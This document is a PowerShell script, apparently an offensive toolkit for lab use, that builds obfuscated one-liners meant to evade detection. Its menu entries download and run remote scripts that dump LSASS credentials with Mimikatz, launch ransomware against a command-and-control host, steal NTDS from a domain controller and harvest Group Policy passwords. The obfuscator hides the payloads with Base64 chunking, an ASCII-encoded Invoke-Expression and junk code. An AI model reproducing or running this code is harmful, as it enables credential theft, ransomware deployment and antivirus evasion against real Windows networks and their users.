# Function to generate an interactive menu with obfuscated PowerShell commands
function Get-ObfuscatedCommandMenu {

# Global Function

function global:prompt {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
   
    $userColor = "Cyan"                  # Soft cyan for username@host
    $promptColor = if ($isAdmin) { "Yellow" } else { "Green" }  # Soft yellow for admin !, green for $
    $promptSign = if ($isAdmin) { "!" } else { "$" }
    
    Write-Host "┌──(" -ForegroundColor DarkGray -NoNewline
    Write-Host "$env:USERNAME@$env:COMPUTERNAME" -ForegroundColor $userColor -NoNewline
    Write-Host ")-[" -ForegroundColor DarkGray -NoNewline
    Write-Host "PCT" -ForegroundColor Magenta -NoNewline          # Soothing magenta highlight
    Write-Host "]" -ForegroundColor DarkGray
    Write-Host "└─$promptSign " -ForegroundColor $promptColor -NoNewline
    
    return " "
}


    # Function to display the professional header
    function Show-Header {
        Clear-Host
        $headerColor = "Cyan"
        $accentColor = "DarkCyan"
        
        Write-Host "╔═════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor $headerColor
        Write-Host "║                           POWERSHELL COMMANDS TOOLKIT                       ║" -ForegroundColor $headerColor
        Write-Host "║                                    by dGiri                                 ║" -ForegroundColor $accentColor
        Write-Host "╚═════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor $headerColor
        Write-Host ""
    }

    # Function to display obfuscation information
    function Show-ObfuscationInfo {
        Clear-Host
        Show-Header
        
        Write-Host "┌─ OBFUSCATION TECHNIQUES USED ───────────────────────────────────────────────┐" -ForegroundColor "Yellow"
        Write-Host "│                                                                             │" -ForegroundColor "Yellow"
        Write-Host "│ This tool employs multiple advanced obfuscation techniques:                 │" -ForegroundColor "White"
        Write-Host "│                                                                             │" -ForegroundColor "Yellow"
        Write-Host "│ 1. BASE64 ENCODING:                                                         │" -ForegroundColor "Green"
        Write-Host "│    • Converts the original command to Base64 encoding                       │" -ForegroundColor "Gray"
        Write-Host "│    • Provides fundamental layer of obfuscation                              │" -ForegroundColor "Gray"
        Write-Host "│                                                                             │" -ForegroundColor "Yellow"
        Write-Host "│ 2. DYNAMIC VARIABLE NAMING:                                                 │" -ForegroundColor "Green"
        Write-Host "│    • Generates random variable names (5-10 characters)                      │" -ForegroundColor "Gray"
        Write-Host "│    • Makes scripts less predictable and harder to analyze                   │" -ForegroundColor "Gray"
        Write-Host "│                                                                             │" -ForegroundColor "Yellow"
        Write-Host "│ 3. ASCII VALUE RECONSTRUCTION:                                              │" -ForegroundColor "Green"
        Write-Host "│    • Obfuscates 'Invoke-Expression' using ASCII values                      │" -ForegroundColor "Gray"
        Write-Host "│    • Dynamically reconstructs command names at runtime                      │" -ForegroundColor "Gray"
        Write-Host "│                                                                             │" -ForegroundColor "Yellow"
        Write-Host "│ 4. PAYLOAD CHUNKING:                                                        │" -ForegroundColor "Green"
        Write-Host "│    • Splits Base64 strings into random chunks (3-6 pieces)                  │" -ForegroundColor "Gray"
        Write-Host "│    • Prevents static analysis from identifying full payload                 │" -ForegroundColor "Gray"
        Write-Host "│                                                                             │" -ForegroundColor "Yellow"
        Write-Host "│ 5. JUNK CODE INJECTION:                                                     │" -ForegroundColor "Green"
        Write-Host "│    • Adds harmless operations to obscure true intent                        │" -ForegroundColor "Gray"
        Write-Host "│    • Creates noise in the script structure                                  │" -ForegroundColor "Gray"
        Write-Host "│                                                                             │" -ForegroundColor "Yellow"
        Write-Host "│ 6. DYNAMIC EXECUTION:                                                       │" -ForegroundColor "Green"
        Write-Host "│    • Uses call operator (&) with variable-stored commands                   │" -ForegroundColor "Gray"
        Write-Host "│    • Executes reconstructed commands at runtime                             │" -ForegroundColor "Gray"
        Write-Host "│                                                                             │" -ForegroundColor "Yellow"
        Write-Host "└─────────────────────────────────────────────────────────────────────────────┘" -ForegroundColor "Yellow"
        Write-Host ""
        Write-Host "Press any key to return to main menu..." -ForegroundColor "Magenta"
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }

    # Function to show a professional loading animation
    function Show-Loading {
        param([string]$Message = "Processing")
        
        $spinner = @('|', '/', '-', '\')
        $counter = 0
        
        Write-Host ""
        for ($i = 0; $i -lt 20; $i++) {
            Write-Host "`r$Message $($spinner[$counter % 4])" -NoNewline -ForegroundColor "Yellow"
            Start-Sleep -Milliseconds 100
            $counter++
        }
        Write-Host "`r$Message... Complete!" -ForegroundColor "Green"
        Start-Sleep -Milliseconds 500
    }

    # Define the menu options with corresponding commands
    $menuOptions = @{
    1 = @{
        Name    = "Run Girikatz"
        Command = {
            Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
            $script = (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/IAMinZoho/Girism/refs/heads/main/Girikatz.ps1')
            Invoke-Expression $script
            Girikatz
        }
    }
    2 = @{
        Name    = "Run MSRansom launcher (Ensure C2Server is running)"
        # Run this on WSServer and ensure C2Server is running on WSClient with Ethan logged in
        Command = {
            $msRansomArgs = '-NoProfile -ExecutionPolicy Bypass -Command "& {[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/IAMinZoho/MSRansom/main/MSRansom.ps1'')); MSRansom -e ''C:\Users\VMAdmin\Desktop\Hackme'' -s 172.24.153.145 -p 80 -x -Attack}"'
            Start-Process powershell -ArgumentList $msRansomArgs -WindowStyle Normal
        }
    }
    3 = @{
        Name    = "Run Mimikatz and Dump Creds from LSASS"
        Command = {
            Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
            $script = (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/IAMinZoho/Girism/refs/heads/main/Invoke-Mimikatz.ps1')
            Invoke-Expression $script
            Invoke-Mimikatz -DumpCreds
        }
    }

    4 = @{
        Name    = "Run Security Log Health Check"
        Command = {
            Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
            $script = (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/IAMinZoho/Girism/refs/heads/main/Start-SecurityLogHealthCheck.ps1')
            Invoke-Expression $script
        }
    }

    5 = @{
        Name    = "Check Disk Space"
        Command = { Get-Disk }
    }

    6 = @{
        Name    = "Steal NTDS from Domain Controller"
        Command = {
        powershell -NoExit -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/IAMinZoho/Girism/refs/heads/main/Create-NTDSBackup.ps1'))"
        }
    }

    7 = @{
        Name    = "GPP Password Scanner"
        Command = {
        powershell -NoExit -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/IAMinZoho/Girism/refs/heads/main/Get-GPPPassword.ps1'));Get-GPPPassword"
        }
    }


  
    8 = @{
        Name    = "Show Obfuscation Info"
        Command = $null
    }
  
    9 = @{
        Name    = "Exit"
        Command = $null
    }
}

    # Function to obfuscate a PowerShell command using multiple advanced techniques
    function Obfuscate-Command {
        param ([string]$Command)

        if (-not $Command) { return $null }

        # Step 1: Base64 encode the entire original command
        # This provides a fundamental layer of obfuscation for the payload itself.
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
        $encoded = [Convert]::ToBase64String($bytes)

        # Helper function to generate unique random variable names
        # This makes the obfuscated script less predictable.
        function Get-RandomVariableNameInternal {
            $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
            $name = ''
            # Generate a name between 5 and 10 characters long
            for ($i = 0; $i -lt (Get-Random -Minimum 5 -Maximum 10); $i++) {
                $name += $chars[(Get-Random -Maximum $chars.Length)]
            }
            return $name
        }

        # Step 2: Obfuscate "Invoke-Expression" using ASCII values and dynamic reconstruction
        # This avoids the direct string "Invoke-Expression" or "iex" in the script.
        $iexAsciiValues = [int[]]([char[]]'Invoke-Expression')
        $iexAsciiVarName = Get-RandomVariableNameInternal
        $iexCmdVarName = Get-RandomVariableNameInternal

        # Step 3: Split the Base64 encoded string into random chunks
        # This makes it harder for static analysis to identify the full Base64 payload.
        $numChunks = Get-Random -Minimum 3 -Maximum 6 # Split into 3 to 5 chunks
        $chunkSize = [System.Math]::Ceiling($encoded.Length / $numChunks)
        $encodedChunks = @()
        $chunkVarNames = @()
        for ($i = 0; $i -lt $numChunks; $i++) {
            $start = $i * $chunkSize
            $length = [System.Math]::Min($chunkSize, $encoded.Length - $start)
            $chunk = $encoded.Substring($start, $length)
            $encodedChunks += $chunk
            $chunkVarNames += Get-RandomVariableNameInternal # Assign a random name for each chunk variable
        }

        # Step 4: Construct the final, highly obfuscated command string
        $obfuscatedScript = ""

        # Define the array of ASCII values for "Invoke-Expression"
        # Backticks (`) are used to escape '$' for variables that will exist in the *generated* script.
        $obfuscatedScript += "`$$iexAsciiVarName = @("
        $obfuscatedScript += ($iexAsciiValues | ForEach-Object { "$_" }) -join ','
        $obfuscatedScript += "); "

        # Reconstruct the "Invoke-Expression" command name from ASCII values
        $obfuscatedScript += "`$$iexCmdVarName = -join (`$$iexAsciiVarName | ForEach-Object { [char]`$_ }); "

        # Define variables for each Base64 chunk
        for ($i = 0; $i -lt $numChunks; $i++) {
            $obfuscatedScript += "`$$($chunkVarNames[$i]) = '$($encodedChunks[$i])'; "
        }

        # Concatenate the Base64 chunks into a single variable
        $fullEncodedVarName = Get-RandomVariableNameInternal
        $obfuscatedScript += "`$$fullEncodedVarName = "
        $obfuscatedScript += ($chunkVarNames | ForEach-Object { "`$$_" }) -join ' + '
        $obfuscatedScript += "; "

        # Add some junk code to further obscure the true intent
        # These operations are harmless but add noise to the script.
        $junkVar1 = Get-RandomVariableNameInternal
        $junkVar2 = Get-RandomVariableNameInternal
        $obfuscatedScript += "`$$junkVar1 = (Get-Random -Minimum 100 -Maximum 999); `$$junkVar2 = '`$($junkVar1) is a random number.'; "
        $junkVar3 = Get-RandomVariableNameInternal
        # FIX: Correctly escape the subexpression for Get-Date to ensure it's a literal string in the generated output.
        # Use single quotes for the literal string, and escape the inner single quotes for the format string.
        # The backtick before `$(...` ensures the subexpression is not evaluated during generation.
        $obfuscatedScript += "`$$junkVar3 = '`$(Get-Date -Format ''yyyyMMddHHmmss'')'; "

        # Execute the Base64 decoded command using the dynamically reconstructed Invoke-Expression
        # The '&' (call operator) is used to execute the command stored in a variable.
        $obfuscatedScript += "& `$$iexCmdVarName ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$$fullEncodedVarName)))"

        return $obfuscatedScript
    }

    # Main menu loop
    while ($true) {
        Show-Header
        
        # Display the menu with enhanced formatting
        Write-Host "┌─ MAIN MENU ─────────────────────────────────────────────────────────────────┐" -ForegroundColor "Green"
        Write-Host "│ Select an option to generate and copy obfuscated command to clipboard:      │" -ForegroundColor "White"
        Write-Host "├─────────────────────────────────────────────────────────────────────────────┤" -ForegroundColor "Green"

        # Display menu options with professional formatting
        foreach ($key in ($menuOptions.Keys | Sort-Object)) {
            $optionText = "$key. $($menuOptions[$key].Name)"
            $padding = 76 - $optionText.Length
            Write-Host "│ $optionText$(' ' * $padding)│" -ForegroundColor "Cyan"
        }

        Write-Host "└─────────────────────────────────────────────────────────────────────────────┘" -ForegroundColor "Green"
        Write-Host ""

        # Enhanced prompt
        Write-Host "┌─ INPUT ─────────────────────────────────────────────────────────────────────┐" -ForegroundColor "Yellow"
        Write-Host "│ Enter your choice [1-$($menuOptions.Count)] or 'Q' to quit:                                     │" -ForegroundColor "White"
        Write-Host "└─────────────────────────────────────────────────────────────────────────────┘" -ForegroundColor "Yellow"
        Write-Host ""
        Write-Host "Choice: " -ForegroundColor "Magenta" -NoNewline
        $choice = Read-Host

        # Handle quit command
        if ($choice -eq 'q' -or $choice -eq 'Q') {
            Clear-Host
            Show-Header
            Write-Host "┌─ GOODBYE ───────────────────────────────────────────────────────────────────┐" -ForegroundColor "Magenta"
            Write-Host "│ Thank you for using PowerShell Commands Toolkit!                            │" -ForegroundColor "White"
            Write-Host "│ Stay secure and happy scripting!                                            │" -ForegroundColor "White"
            Write-Host "└─────────────────────────────────────────────────────────────────────────────┘" -ForegroundColor "Magenta"
            Write-Host ""
            break
        }

        # Validate input
        if ($choice -match '^\d+$' -and $menuOptions.ContainsKey([int]$choice)) {
            if ($choice -eq 9) {
                Clear-Host
                Show-Header
                Write-Host "┌─ GOODBYE ───────────────────────────────────────────────────────────────────┐" -ForegroundColor "Magenta"
                Write-Host "│ Thank you for using PowerShell Commands Toolkit!                            │" -ForegroundColor "White"
                Write-Host "│ Stay secure and happy scripting!                                            │" -ForegroundColor "White"
                Write-Host "└─────────────────────────────────────────────────────────────────────────────┘" -ForegroundColor "Magenta"
                Write-Host ""
                break
            }

            if ($choice -eq 8) {
                Show-ObfuscationInfo
                continue
            }

            # Get the selected command and obfuscate it
            $selectedCommand = $menuOptions[[int]$choice].Command
            
            Show-Loading "Generating obfuscated command"
            $obfuscatedCommand = Obfuscate-Command -Command $selectedCommand

            # Copy to clipboard
            try {
                Set-Clipboard -Value $obfuscatedCommand
                $clipboardStatus = "Successfully copied to clipboard"
                $clipboardColor = "Green"
            } catch {
                $clipboardStatus = "Failed to copy to clipboard"
                $clipboardColor = "Red"
            }

            Clear-Host
            Show-Header
            
            Write-Host "┌─ OBFUSCATION COMPLETE ──────────────────────────────────────────────────────┐" -ForegroundColor "Green"
            Write-Host "│ Command: $($menuOptions[[int]$choice].Name)$(' ' * (67 - $menuOptions[[int]$choice].Name.Length))│" -ForegroundColor "White"
            Write-Host "│ Status: $clipboardStatus$(' ' * (68 - $clipboardStatus.Length))│" -ForegroundColor $clipboardColor
            Write-Host "├─────────────────────────────────────────────────────────────────────────────┤" -ForegroundColor "Green"
            Write-Host "│ OBFUSCATED OUTPUT:                                                          │" -ForegroundColor "Yellow"
            Write-Host "├─────────────────────────────────────────────────────────────────────────────┤" -ForegroundColor "Green"

            # Display the obfuscated command within the box-drawing characters
            $boxWidth = 79 # Total width of the box, including borders
            $innerWidth = $boxWidth - 4 # 2 for '│ ' on left, 2 for ' │' on right

            # Split the obfuscated command into lines that fit within the inner width
            $lines = @()
            $tempCommand = $obfuscatedCommand
            while ($tempCommand.Length -gt 0) {
                if ($tempCommand.Length -gt $innerWidth) {
                    # Find the last space within the innerWidth to avoid breaking words
                    $linePart = $tempCommand.Substring(0, $innerWidth)
                    $lastSpace = $linePart.LastIndexOf(' ')
                    
                    if ($lastSpace -gt 0) {
                        $lineToAdd = $tempCommand.Substring(0, $lastSpace)
                        $tempCommand = $tempCommand.Substring($lastSpace + 1).TrimStart()
                    } else {
                        # No space found, break mid-word
                        $lineToAdd = $tempCommand.Substring(0, $innerWidth)
                        $tempCommand = $tempCommand.Substring($innerWidth)
                    }
                } else {
                    $lineToAdd = $tempCommand
                    $tempCommand = ""
                }
                $lines += $lineToAdd
            }

            foreach ($line in $lines) {
                $padding = $innerWidth - $line.Length
                Write-Host "│ $line$(' ' * $padding) │" -ForegroundColor "White"
            }
            
            Write-Host "└─────────────────────────────────────────────────────────────────────────────┘" -ForegroundColor "Green"
            Write-Host ""
            Write-Host "┌─ CONTINUE ──────────────────────────────────────────────────────────────────┐" -ForegroundColor "Magenta"
            Write-Host "│ Press any key to return to main menu...                                     │" -ForegroundColor "White"
            Write-Host "└─────────────────────────────────────────────────────────────────────────────┘" -ForegroundColor "Magenta"
            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        } else {
            Clear-Host
            Show-Header
            Write-Host "┌─ ERROR ─────────────────────────────────────────────────────────────────────┐" -ForegroundColor "Red"
            Write-Host "│ Invalid input detected!                                                     │" -ForegroundColor "White"
            Write-Host "│ Please enter a number between 1 and $($menuOptions.Count), or 'Q' to quit.                      │" -ForegroundColor "White"
            Write-Host "└─────────────────────────────────────────────────────────────────────────────┘" -ForegroundColor "Red"
            Write-Host ""
            Write-Host "Press any key to try again..." -ForegroundColor "Yellow"
            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
    }
}

# Example usage: Call the function to start the interactive menu
Get-ObfuscatedCommandMenu
